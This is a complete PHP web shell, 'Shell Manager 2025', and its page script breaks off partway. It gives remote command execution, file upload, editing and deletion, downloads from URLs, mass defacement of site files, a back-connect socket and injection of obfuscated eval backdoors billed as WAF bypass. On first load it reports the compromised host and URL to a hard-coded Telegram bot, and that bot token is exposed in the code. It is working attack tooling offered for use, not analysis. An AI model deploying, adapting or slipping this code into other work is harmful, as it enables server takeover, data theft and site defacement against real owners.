<?php
error_reporting(0);
set_time_limit(0);
session_start();

// ==== CONFIG TELEGRAM ====
$TG_TOKEN = "8247659564:AAGnRi5l4gaBrc1oT6o_EWJexsUqSxJKWjA";
$TG_CHATID = "7418826020";

// 🔹 AJAX Request Handler
if (isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    
    $action = $_POST['action'] ?? '';
    $response = ['success' => false, 'message' => '', 'data' => []];
    
    switch ($action) {
        case 'upload':
            if (!empty($_FILES['file'])) {
                $uploaded = [];
                foreach ($_FILES['file']['name'] as $i => $name) {
                    if ($_FILES['file']['error'][$i] === UPLOAD_ERR_OK) {
                        $tmp_name = $_FILES['file']['tmp_name'][$i];
                        $name = basename($name);
                        $destination = getcwd() . '/' . $name;
                        
                        if (move_uploaded_file($tmp_name, $destination)) {
                            $uploaded[] = $name;
                            tg("File uploaded: $name");
                        }
                    }
                }
                $response['success'] = !empty($uploaded);
                $response['message'] = count($uploaded) . ' file(s) uploaded';
                $response['data'] = $uploaded;
            }
            break;
            
        case 'delete':
            $files = $_POST['files'] ?? [];
            $deleted = [];
            foreach ($files as $file) {
                if (file_exists($file)) {
                    if (is_dir($file)) {
                        rrmdir($file);
                    } else {
                        @unlink($file);
                    }
                    $deleted[] = $file;
                }
            }
            $response['success'] = !empty($deleted);
            $response['message'] = count($deleted) . ' file(s) deleted';
            $response['data'] = $deleted;
            break;
            
        case 'copy':
            $_SESSION['clipboard'] = $_POST['files'] ?? [];
            $_SESSION['copy_mode'] = 'copy';
            $response['success'] = true;
            $response['message'] = count($_SESSION['clipboard']) . ' item(s) copied';
            break;
            
        case 'cut':
            $_SESSION['clipboard'] = $_POST['files'] ?? [];
            $_SESSION['copy_mode'] = 'move';
            $response['success'] = true;
            $response['message'] = count($_SESSION['clipboard']) . ' item(s) cut';
            break;
            
        case 'paste':
            if (!empty($_SESSION['clipboard'])) {
                $pasted = [];
                foreach ($_SESSION['clipboard'] as $file) {
                    $dest = getcwd() . '/' . basename($file);
                    if ($_SESSION['copy_mode'] === 'copy') {
                        if (copy($file, $dest)) {
                            $pasted[] = basename($file);
                        }
                    } else {
                        if (rename($file, $dest)) {
                            $pasted[] = basename($file);
                        }
                    }
                }
                $response['success'] = !empty($pasted);
                $response['message'] = count($pasted) . ' item(s) pasted';
                $response['data'] = $pasted;
                unset($_SESSION['clipboard']);
            }
            break;
            
        case 'mkdir':
            $folder = $_POST['folder'] ?? '';
            if ($folder && !file_exists($folder)) {
                $response['success'] = @mkdir($folder, 0777, true);
                $response['message'] = $response['success'] ? 'Folder created' : 'Failed to create folder';
            }
            break;
            
        case 'zip':
            $files = $_POST['files'] ?? [];
            $zipname = $_POST['zipname'] ?? 'archive.zip';
            if (!empty($files)) {
                $zip = new ZipArchive();
                if ($zip->open($zipname, ZipArchive::CREATE) === TRUE) {
                    foreach ($files as $file) {
                        if (file_exists($file)) {
                            $zip->addFile($file, basename($file));
                        }
                    }
                    $zip->close();
                    $response['success'] = true;
                    $response['message'] = "ZIP created: $zipname";
                }
            }
            break;
            
        case 'unzip':
            $file = $_POST['file'] ?? '';
            if ($file && file_exists($file)) {
                $zip = new ZipArchive();
                if ($zip->open($file) === TRUE) {
                    $zip->extractTo('.');
                    $zip->close();
                    $response['success'] = true;
                    $response['message'] = "File extracted: $file";
                }
            }
            break;
            
        case 'execute':
            $cmd = $_POST['cmd'] ?? '';
            if ($cmd) {
                $output = stealth_exec($cmd);
                $response['success'] = true;
                $response['data'] = htmlspecialchars($output);
            }
            break;
            
        case 'get_files':
            $dir = $_POST['dir'] ?? getcwd();
            if (is_dir($dir)) {
                chdir($dir);
                $files = [];
                foreach (scandir('.') as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $path = realpath($item);
                    $files[] = [
                        'name' => $item,
                        'path' => $path,
                        'is_dir' => is_dir($path),
                        'size' => is_dir($path) ? 'DIR' : sz(filesize($path)),
                        'perms' => substr(sprintf('%o', fileperms($path)), -4),
                        'ext' => strtolower(pathinfo($path, PATHINFO_EXTENSION))
                    ];
                }
                $response['success'] = true;
                $response['data'] = $files;
                $response['current_dir'] = getcwd();
            }
            break;
            
        case 'change_dir':
            $dir = $_POST['dir'] ?? '';
            if ($dir && is_dir($dir)) {
                chdir($dir);
                $response['success'] = true;
                $response['current_dir'] = getcwd();
            }
            break;
            
        case 'edit_file':
            $file = $_POST['file'] ?? '';
            $content = $_POST['content'] ?? '';
            if ($file && file_exists($file)) {
                if ($content !== null) {
                    file_put_contents($file, $content);
                    $response['success'] = true;
                    $response['message'] = 'File saved';
                } else {
                    $response['success'] = true;
                    $response['data'] = file_get_contents($file);
                }
            }
            break;
            
        case 'download_url':
            $url = $_POST['url'] ?? '';
            $filename = $_POST['filename'] ?? basename($url);
            if ($url) {
                if (@copy($url, $filename)) {
                    $response['success'] = true;
                    $response['message'] = "File downloaded: $filename";
                }
            }
            break;
            
        case 'mass_deface':
            $extensions = explode(',', $_POST['extensions'] ?? 'html,htm,php');
            $message = $_POST['message'] ?? 'HACKED';
            $count = 0;
            
            foreach ($extensions as $ext) {
                $ext = trim($ext);
                $files = glob("*.$ext");
                foreach ($files as $file) {
                    if (file_put_contents($file, $message) !== false) {
                        $count++;
                    }
                }
            }
            
            $response['success'] = $count > 0;
            $response['message'] = "$count file(s) defaced";
            break;
            
        case 'back_connect':
            $ip = $_POST['ip'] ?? '';
            $port = $_POST['port'] ?? '';
            
            if ($ip && $port) {
                $sock = @fsockopen($ip, $port);
                if ($sock) {
                    fwrite($sock, "Connected\n");
                    while (!feof($sock)) {
                        echo fgets($sock, 1024);
                    }
                    fclose($sock);
                    $response['success'] = true;
                    $response['message'] = "Connected to $ip:$port";
                }
            }
            break;
            
        case 'waf_inject':
            $file = $_POST['file'] ?? '';
            $payload = $_POST['payload'] ?? '';
            $method = $_POST['method'] ?? 'base64';
            
            if ($file && $payload) {
                $encoded = encode_payload($payload, $method);
                if (@file_put_contents($file, $encoded)) {
                    $response['success'] = true;
                    $response['message'] = "Payload injected using $method";
                }
            }
            break;
    }
    
    echo json_encode($response);
    exit;
}

// 🔹 HELPER FUNCTIONS
function encode_payload($payload, $method) {
    switch ($method) {
        case 'base64':
            return '<?php eval(base64_decode("' . base64_encode($payload) . '")); ?>';
        case 'rot13':
            return '<?php eval(str_rot13("' . str_rot13($payload) . '")); ?>';
        case 'hex':
            return '<?php eval(pack("H*","' . bin2hex($payload) . '")); ?>';
        case 'gzip':
            return '<?php eval(gzinflate(base64_decode("' . base64_encode(gzdeflate($payload)) . '")); ?>';
        default:
            return $payload;
    }
}

function stealth_exec($cmd) {
    $methods = [
        'backtick' => `$cmd`,
        'shell_exec' => shell_exec($cmd),
        'system' => system($cmd),
        'passthru' => passthru($cmd),
    ];
    
    foreach ($methods as $method => $func) {
        if ($result = $func) {
            return $result;
        }
    }
    return '';
}

function tg($msg) {
    global $TG_TOKEN, $TG_CHATID;
    if (!$TG_TOKEN || !$TG_CHATID) return;
    @file_get_contents("https://api.telegram.org/bot$TG_TOKEN/sendMessage?chat_id=$TG_CHATID&text=" . urlencode($msg));
}

function sz($bytes) {
    if ($bytes == 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    for ($i = 0; $bytes > 1024; $i++) $bytes /= 1024;
    return round($bytes, 2) . ' ' . $units[$i];
}

function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir."/".$object))
                    rrmdir($dir."/".$object);
                else
                    unlink($dir."/".$object);
            }
        }
        rmdir($dir);
    }
}

// Initialize session
if (!isset($_SESSION['sent'])) {
    tg("Shell aktif!\nHost: " . $_SERVER['HTTP_HOST'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nURL: https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
    $_SESSION['sent'] = true;
}

// Password protection
$pass = "";
if ($pass && (!isset($_SESSION['login']) || $_SESSION['login'] !== true)) {
    if (md5($_POST['p']) !== $pass) {
        echo '<!DOCTYPE html><html><head><title>Login</title><style>body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace}.login-box{background:rgba(255,255,255,0.1);padding:40px;border-radius:15px;text-align:center;backdrop-filter:blur(10px)}input{padding:15px;margin:10px;border-radius:8px;border:1px solid #667eea;background:transparent;color:white;width:300px}button{background:#667eea;color:white;border:none;padding:15px 30px;border-radius:8px;cursor:pointer}</style></head><body><div class="login-box"><h2 style="color:white">🔐 Login Required</h2><form method="post"><input type="password" name="p" placeholder="Password" required><br><button type="submit">Access</button></form></div></body></html>';
        exit;
    }
    $_SESSION['login'] = true;
}

// Handle directory change via POST
if (isset($_POST['dir']) && is_dir($_POST['dir'])) {
    chdir($_POST['dir']);
}

// Handle GET actions
if (isset($_GET['download']) && file_exists($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Shell Manager 2025</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        :root {
            --primary: #667eea;
            --secondary: #764ba2;
            --dark: #1a1a2e;
            --darker: #16213e;
            --light: #f8f9fa;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --info: #3b82f6;
            --border-radius: 12px;
            --box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
        }

        body {
            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
            color: var(--light);
            min-height: 100vh;
        }

        /* Taskbar */
        .taskbar {
            position: fixed;
            top: 0;
            right: 0;
            height: 100vh;
            width: 70px;
            background: rgba(26, 26, 46, 0.95);
            backdrop-filter: blur(10px);
            border-left: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            flex-direction: column;
            padding: 20px 0;
            z-index: 1000;
            transition: width 0.3s ease;
        }

        .taskbar:hover {
            width: 250px;
        }

        .taskbar-item {
            width: 100%;
            padding: 15px 20px;
            color: #94a3b8;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 15px;
            transition: all 0.3s;
            white-space: nowrap;
            overflow: hidden;
            cursor: pointer;
            border: none;
            background: none;
            text-align: left;
        }

        .taskbar-item:hover, .taskbar-item.active {
            background: rgba(102, 126, 234, 0.2);
            color: var(--light);
            padding-left: 25px;
        }

        .taskbar-item i {
            font-size: 20px;
            min-width: 30px;
            text-align: center;
        }

        .taskbar-item span {
            opacity: 0;
            transition: opacity 0.3s;
        }

        .taskbar:hover .taskbar-item span {
            opacity: 1;
        }

        /* Mobile Toggle */
        .mobile-toggle {
            display: none;
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1001;
            background: var(--primary);
            color: white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: none;
            font-size: 24px;
            cursor: pointer;
            box-shadow: var(--box-shadow);
        }

        /* Main Container */
        .main-container {
            margin-right: 70px;
            padding: 20px;
            transition: margin-right 0.3s;
        }

        .taskbar:hover ~ .main-container {
            margin-right: 250px;
        }

        /* Header */
        .header {
            background: rgba(26, 26, 46, 0.8);
            backdrop-filter: blur(10px);
            border-radius: var(--border-radius);
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: var(--box-shadow);
        }

        .server-info {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }

        /* Content Area */
        .content-area {
            background: rgba(26, 26, 46, 0.8);
            backdrop-filter: blur(10px);
            border-radius: var(--border-radius);
            padding: 25px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: var(--box-shadow);
            min-height: 500px;
        }

        .content-section {
            display: none;
        }

        .content-section.active {
            display: block;
        }

        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 14px;
        }

        .btn-primary { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; }
        .btn-success { background: linear-gradient(45deg, var(--success), #0d9488); color: white; }
        .btn-warning { background: linear-gradient(45deg, var(--warning), #d97706); color: white; }
        .btn-danger { background: linear-gradient(45deg, var(--danger), #dc2626); color: white; }
        .btn-info { background: linear-gradient(45deg, var(--info), #2563eb); color: white; }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        /* File Table */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        .file-table th {
            background: rgba(102, 126, 234, 0.2);
            padding: 12px;
            text-align: left;
            font-weight: 600;
            color: var(--primary);
        }

        .file-table td {
            padding: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .file-table tr:hover td {
            background: rgba(255, 255, 255, 0.05);
        }

        /* Forms */
        .form-group {
            margin-bottom: 20px;
        }

        .form-control {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: white;
        }

        /* Alerts */
        .alert {
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .alert-success {
            background: rgba(16, 185, 129, 0.2);
            border-left: 4px solid var(--success);
        }

        .alert-error {
            background: rgba(239, 68, 68, 0.2);
            border-left: 4px solid var(--danger);
        }

        /* Loading */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: var(--primary);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Mobile Responsive */
        @media (max-width: 768px) {
            .taskbar {
                width: 0;
                right: -100%;
                transition: right 0.3s;
            }

            .taskbar.active {
                width: 280px;
                right: 0;
            }

            .mobile-toggle {
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .main-container {
                margin-right: 0;
                padding: 15px;
            }

            .taskbar:hover ~ .main-container {
                margin-right: 0;
            }
        }
    </style>
</head>
<body>
    <!-- Mobile Toggle Button -->
    <button class="mobile-toggle" onclick="toggleTaskbar()">
        <i class="fas fa-bars"></i>
    </button>

    <!-- Taskbar -->
    <div class="taskbar" id="taskbar">
        <button class="taskbar-item" onclick="openSection('files')">
            <i class="fas fa-folder"></i>
            <span>File Manager</span>
        </button>
        <button class="taskbar-item" onclick="openSection('upload')">
            <i class="fas fa-cloud-upload-alt"></i>
            <span>Upload Anywhere</span>
        </button>
        <button class="taskbar-item" onclick="openSection('deface')">
            <i class="fas fa-code"></i>
            <span>Mass Deface</span>
        </button>
        <button class="taskbar-item" onclick="openSection('zip')">
            <i class="fas fa-file-archive"></i>
            <span>Zip Tools</span>
        </button>
        <button class="taskbar-item" onclick="openSection('console')">
            <i class="fas fa-terminal"></i>
            <span>Console</span>
        </button>
        <button class="taskbar-item" onclick="openSection('backconnect')">
            <i class="fas fa-plug"></i>
            <span>Back Connect</span>
        </button>
        <button class="taskbar-item" onclick="openSection('waf')">
            <i class="fas fa-shield-alt"></i>
            <span>WAF Bypass</span>
        </button>
        <button class="taskbar-item" onclick="openSection('remove')">
            <i class="fas fa-trash"></i>
            <span>Self Remove</span>
        </button>
    </div>

    <!-- Main Content -->
    <div class="main-container">
        <!-- Header -->
        <div class="header">
            <h1 style="background:linear-gradient(45deg,var(--primary),var(--secondary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:15px">
                <i class="fas fa-terminal"></i> Shell Manager 2025
            </h1>
            
            <div class="server-info">
                <div style="display:flex;align-items:center;gap:8px;color:#94a3b8">
                    <i class="fas fa-server" style="color:var(--primary)"></i>
                    <span><?= htmlspecialchars($_SERVER['HTTP_HOST']) ?></span>
                </div>
                <div style="display:flex;align-items:center;gap:8px;color:#94a3b8">
                    <i class="fas fa-folder" style="color:var(--primary)"></i>
                    <span id="current-path"><?= htmlspecialchars(getcwd()) ?></span>
                </div>
                <div style="display:flex;align-items:center;gap:8px;color:#94a3b8">
                    <i class="fas fa-database" style="color:var(--primary)"></i>
                    <span><?= sz(disk_free_space(".")) ?> free</span>
                </div>
            </div>

            <div style="display:flex;gap:10px;margin-top:20px">
                <input type="text" id="change-dir" class="form-control" placeholder="Change directory..." value="<?= htmlspecialchars(getcwd()) ?>">
                <button class="btn btn-primary" onclick="changeDirectory()">
                    <i class="fas fa-arrow-right"></i> Go
                </button>
                <button class="btn btn-info" onclick="loadFiles()">
                    <i class="fas fa-sync"></i> Refresh
                </button>
            </div>
        </div>

        <!-- Content Area -->
        <div class="content-area">
            <!-- File Manager -->
            <div id="files-section" class="content-section active">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px">
                    <h2><i class="fas fa-files"></i> File Manager</h2>
                    <div>
                        <input type="file" id="file-upload" multiple style="display:none" onchange="uploadFiles()">
                        <button class="btn btn-success" onclick="document.getElementById('file-upload').click()">
                            <i class="fas fa-upload"></i> Upload
                        </button>
                    </div>
                </div>

                <div id="alert-container"></div>

                <div id="files-container">
                    <div style="text-align:center;padding:40px">
                        <div class="loading"></div>
                        <p style="color:#94a3b8;margin-top:10px">Loading files...</p>
                    </div>
                </div>

                <div id="action-buttons" style="display:none;margin-top:20px;display:flex;flex-wrap:wrap;gap:10px">
                    <button class="btn btn-info" onclick="copyFiles()">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                    <button class="btn btn-warning" onclick="cutFiles()">
                        <i class="fas fa-cut"></i> Cut
                    </button>
                    <button class="btn btn-success" id="paste-btn" onclick="pasteFiles()" disabled>
                        <i class="fas fa-paste"></i> Paste
                    </button>
                    <button class="btn btn-danger" onclick="deleteFiles()">
                        <i class="fas fa-trash"></i> Delete
                    </button>
                    <button class="btn btn-primary" onclick="createFolder()">
                        <i class="fas fa-folder-plus"></i> New Folder
                    </button>
                    <div style="display:flex;gap:10px;align-items:center">
                        <input type="text" id="zip-name" class="form-control" value="archive.zip" style="width:150px">
                        <button class="btn btn-primary" onclick="createZip()">
                            <i class="fas fa-file-archive"></i> Create ZIP
                        </button>
                    </div>
                </div>
            </div>

            <!-- Upload Anywhere -->
            <div id="upload-section" class="content-section">
                <h2><i class="fas fa-cloud-download-alt"></i> Upload From URL</h2>
                <div class="form-group">
                    <label>File URL</label>
                    <input type="url" id="file-url" class="form-control" placeholder="https://example.com/file.zip">
                </div>
                <div class="form-group">
                    <label>Custom Filename (optional)</label>
                    <input type="text" id="custom-name" class="form-control" placeholder="Leave empty for original name">
                </div>
                <button class="btn btn-success" onclick="downloadFromUrl()">
                    <i class="fas fa-download"></i> Download
                </button>
            </div>

            <!-- Mass Deface -->
            <div id="deface-section" class="content-section">
                <h2><i class="fas fa-bomb"></i> Mass Deface</h2>
                <div class="form-group">
                    <label>File Extensions (comma separated)</label>
                    <input type="text" id="extensions" class="form-control" value="html,htm,php,asp,aspx">
                </div>
                <div class="form-group">
                    <label>Deface Message</label>
                    <textarea id="deface-message" class="form-control" rows="6">HACKED BY NAC DORK 2025</textarea>
                </div>
                <button class="btn btn-danger" onclick="massDeface()">
                    <i class="fas fa-fire"></i> Execute
                </button>
            </div>

            <!-- Zip Tools -->
            <div id="zip-section" class="content-section">
                <h2><i class="fas fa-file-archive"></i> Zip Tools</h2>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
                    <div>
                        <h3>Create ZIP</h3>
                        <div class="form-group">
                            <label>ZIP Filename</label>
                            <input type="text" id="create-zip-name" class="form-control" value="archive.zip">
                        </div>
                        <div id="zip-file-list" style="max-height:200px;overflow-y:auto;background:rgba(255,255,255,0.05);padding:10px;border-radius:8px">
                            <!-- Files will be loaded here -->
                        </div>
                        <button class="btn btn-primary" onclick="createSelectedZip()" style="margin-top:15px">
                            <i class="fas fa-file-archive"></i> Create ZIP
                        </button>
                    </div>
                    <div>
                        <h3>Extract ZIP</h3>
                        <div id="zip-files-list">
                            <!-- ZIP files will be listed here -->
                        </div>
                    </div>
                </div>
            </div>

            <!-- Console -->
            <div id="console-section" class="content-section">
                <h2><i class="fas fa-terminal"></i> Console</h2>
                <div class="form-group">
                    <label>Command</label>
                    <input type="text" id="command" class="form-control" placeholder="Enter command...">
                </div>
                <div style="display:flex;gap:10px;margin-bottom:20px">
                    <button class="btn btn-primary" onclick="executeCommand()">
                        <i class="fas fa-play"></i> Execute
                    </button>
                    <button class="btn btn-info" onclick="setCommand('pwd')">pwd</button>
                    <button class="btn btn-info" onclick="setCommand('ls -la')">ls -la</button>
                    <button class="btn btn-info" onclick="setCommand('whoami')">whoami</button>
                </div>
                <div id="console-output" style="background:#0f172a;padding:20px;border-radius:8px;font-family:monospace;white-space:pre-wrap;max-height:400px;overflow-y:auto">
                    <!-- Output will appear here -->
                </div>
            </div>

            <!-- Back Connect -->
            <div id="backconnect-section" class="content-section">
                <h2><i class="fas fa-plug"></i> Back Connect</h2>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
                    <div class="form-group">
                        <label>Your IP Address</label>
                        <input type="text" id="connect-ip" class="form-control" placeholder="127.0.0.1">
                    </div>
                    <div class="form-group">
                        <label>Port</label>
                        <input type="number" id="connect-port" class="form-control" placeholder="4444">
                    </div>
                </div>
                <button class="btn btn-danger" onclick="backConnect()">
                    <i class="fas fa-bolt"></i> Connect
                </button>
            </div>

            <!-- WAF Bypass -->
            <div id="waf-section" class="content-section">
                <h2><i class="fas fa-shield-alt"></i> WAF Bypass</h2>
                <div class="form-group">
                    <label>Target File</label>
                    <input type="text" id="waf-file" class="form-control" placeholder="/path/to/file.php">
                </div>
                <div class="form-group">
                    <label>Payload</label>
                    <textarea id="waf-payload" class="form-control" rows="6"><?php echo '<?php eval($_POST["cmd"]); ?>'; ?></textarea>
                </div>
                <div class="form-group">
                    <label>Encoding Method</label>
                    <select id="waf-method" class="form-control">
                        <option value="base64">Base64</option>
                        <option value="rot13">ROT13</option>
                        <option value="hex">Hex</option>
                        <option value="gzip">GZIP</option>
                    </select>
                </div>
                <button class="btn btn-danger" onclick="injectWaf()">
                    <i class="fas fa-syringe"></i> Inject
                </button>
            </div>

            <!-- Self Remove -->
            <div id="remove-section" class="content-section">
                <h2><i class="fas fa-skull-crossbones"></i> Self Remove</h2>
                <div style="background:rgba(239,68,68,0.1);padding:30px;border-radius:8px;text-align:center">
                    <i class="fas fa-bomb" style="font-size:48px;color:var(--danger);margin-bottom:20px"></i>
                    <p style="color:#94a3b8;margin-bottom:30px">This will permanently delete the shell script!</p>
                    <button class="btn btn-danger" onclick="selfRemove()" style="padding:15px 40px">
                        <i class="fas fa-trash"></i> DELETE SHELL
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
    // Global state
    let currentSection = 'files';
    let selectedFiles = [];
    let clipboard = <?= json_encode($_SESSION['clipboard'] ?? []) ?>;
    let copyMode = '<?= $_SESSION['copy_mode'] ?? 'copy' ?>';

    // Initialize
    document.addEventListener('DOMContentLoaded', function() {
        loadFiles();
        updatePasteButton();
        setInterval(updateClipboard, 1000);
    });

    // AJAX helper
    async function ajaxRequest(action, data = {}) {
        const formData = new FormData();
        formData.append('ajax', '1');
        formData.append('action', action);
        
        for (const [key, value] of Object.entries(data)) {
            if (value instanceof FileList) {
                for (let i = 0; i < value.length; i++) {
                    formData.append('file[]', value[i]);
                }
            } else if (Array.isArray(value)) {
                value.forEach(item => formData.append(key + '[]', item));
            } else {
                formData.append(key, value);
            }
        }

        try {
            const response = await fetch('', {
                method: 'POST',
                body: formData
            });
            
            return await response.json();
        } catch (error) {
            showAlert('error', 'Request failed: ' + error.message);
            return { success: false, message: 'Request failed' };
        }
    }

    // Section management
    function openSection(section) {
        // Hide all sections
        document.querySelectorAll('.content-section').forEach(el => {
            el.classList.remove('active');
        });
        
        // Update taskbar items
        document.querySelectorAll('.taskbar-item').forEach(el => {
            el.classList.remove('active');
        });
        event.target.classList.add('active');
        
        // Show selected section
        document.getElementById(section + '-section').classList.add('active');
        currentSection = section;
        
        // Load section-specific data
        switch(section) {
            case 'files':
                loadFiles();
                break;
            case 'zip':
                loadZipFiles();
                break;
        }
        
        // Close mobile taskbar
        if (window.innerWidth <= 768) {
            toggleTaskbar();
        }
    }

    // File operations
    async function loadFiles() {
        const container = document.getElementById('files-container');
        container.innerHTML = '<div style="text-align:center;padding:40px"><div class="loading"></div><p style="color:#94a3b8;margin-top:10px">Loading files...</p></div>';
        
        const result = await ajaxRequest('get_files');
        
        if (result.success) {
            document.getElementById('current-path').textContent = result.current_dir;
            document.getElementById('change-dir').value = result.current_dir;
            
            let html = `
                <table class="file-table">
                    <thead>
                        <tr>
                            <th><input type="checkbox" onclick="toggleAllFiles(this)"></th>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Permissions</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
            `;
            
            result.data.forEach(file => {
                html += `
                    <tr>
                        <td><input type="checkbox" value="${file.path}" onchange="updateSelectedFiles()"></td>
                        <td>
                            <i class="fas ${file.is_dir ? 'fa-folder' : 'fa-file'}" style="color:${file.is_dir ? 'var(--success)' : 'var(--primary)'};margin-right:10px"></i>
                            ${file.is_dir ? 
                                `<a href="#" onclick="enterDirectory('${file.path}')" style="color:white;text-decoration:none">${file.name}</a>` : 
                                file.name
                            }
                        </td>
                        <td>${file.size}</td>
                        <td>${file.perms}</td>
                        <td>
                            ${!file.is_dir ? `
                                <button class="btn btn-info" onclick="editFile('${file.path}')" style="padding:5px 10px;font-size:12px">
                                    <i class="fas fa-edit"></i>
                                </button>
                                <a href="?download=${encodeURIComponent(file.path)}" class="btn btn-success" style="padding:5px 10px;font-size:12px">
                                    <i class="fas fa-download"></i>
                                </a>
                                ${file.ext === 'zip' ? `
                                    <button class="btn btn-warning" onclick="extractFile('${file.path}')" style="padding:5px 10px;font-size:12px">
                                        <i class="fas fa-expand"></i>
                                    </button>
                                ` : ''}
                            ` : ''}
                        </td>
                    </tr>
                `;
            });
            
            html += '</tbody></table>';
            container.innerHTML = html;
            document.getElementById('action-buttons').style.display = 'flex';
        } else {
            container.innerHTML = '<div class="alert alert-error"><i class="fas fa-times-circle"></i> Failed to load files</div>';
        }
    }

    function updateSelectedFiles() {
        selectedFiles = Array.from(document.querySelectorAll('input[type="checkbox"]:checked'))
            .map(cb => cb.value)
            .filter(v => v);
    }

    function toggleAllFiles(checkbox) {
        const checkboxes = document.querySelectorAll('input[type="checkbox"]');
        checkboxes.forEach(cb => cb.checked = checkbox.checked);
        updateSelectedFiles();
    }

    async function enterDirectory(path) {
        const result = await ajaxRequest('change_dir', { dir: path });
        if (result.success) {
            loadFiles();
        }
    }

    function changeDirectory() {
        const dir = document.getElementById('change-dir').value;
        enterDirectory(dir);
    }

    async function uploadFiles() {
        const files = document.getElementById('file-upload').files;
        if (files.length === 0) return;
        
        showAlert('info', `Uploading ${files.length} file(s)...`);
        
        const result = await ajaxRequest('upload', { file: files });
        
        if (result.success) {
            showAlert('success', result.message);
            loadFiles();
        } else {
            showAlert('error', 'Upload failed');
        }
    }

    async function copyFiles() {
        if (selectedFiles.length === 0) {
            showAlert('warning', 'Please select files first');
            return;
        }
        
        const result = await ajaxRequest('copy', { files: selectedFiles });
        if (result.success) {
            showAlert('success', result.message);
            updatePasteButton();
        }
    }

    async function cutFiles() {
        if (selectedFiles.length === 0) {
            showAlert('warning', 'Please select files first');
            return;
        }
        
        const result = await ajaxRequest('cut', { files: selectedFiles });
        if (result.success) {
            showAlert('success', result.message);
            updatePasteButton();
        }
    }

    async function pasteFiles() {
        const result = await ajaxRequest('paste');
        if (result.success) {
            showAlert('success', result.message);
            loadFiles();
            updatePasteButton();
        }
    }

    async function deleteFiles() {
        if (selectedFiles.length === 0) {
            showAlert('warning', 'Please select files first');
            return;
        }
        
        if (!confirm(`Delete ${selectedFiles.length} selected item(s)?`)) return;
        
        const result = await ajaxRequest('delete', { files: selectedFiles });
        if (result.success) {
            showAlert('success', result.message);
            loadFiles();
            selectedFiles = [];
        }
    }

    function createFolder() {
        const name = prompt('Enter folder name:');
        if (!name) return;
        
        ajaxRequest('mkdir', { folder: name }).then(result => {
            if (result.success) {
                showAlert('success', result.message);
                loadFiles();
            }
        });
    }

    async function createZip() {
        if (selectedFiles.length === 0) {
            showAlert('warning', 'Please select files first');
            return;
        }
        
        const zipname = document.getElementById('zip-name').value;
        const result = await ajaxRequest('zip', { 
            files: selectedFiles, 
            zipname: zipname 
        });
        
        if (result.success) {
            showAlert('success', result.message);
            loadFiles();
        }
    }

    // Edit file
    function editFile(path) {
        openSection('files');
        
        ajaxRequest('edit_file', { file: path }).then(result => {
            if (result.success) {
                const editor = `
                    <div style="margin-top:20px">
                        <h3>Editing: ${path.split('/').pop()}</h3>
                        <textarea id="editor-content" style="width:100%;height:400px;font-family:monospace;background:#0f172a;color:white;padding:15px;border-radius:8px;border:1px solid rgba(255,255,255,0.2)">${result.data}</textarea>
                        <div style="margin-top:15px">
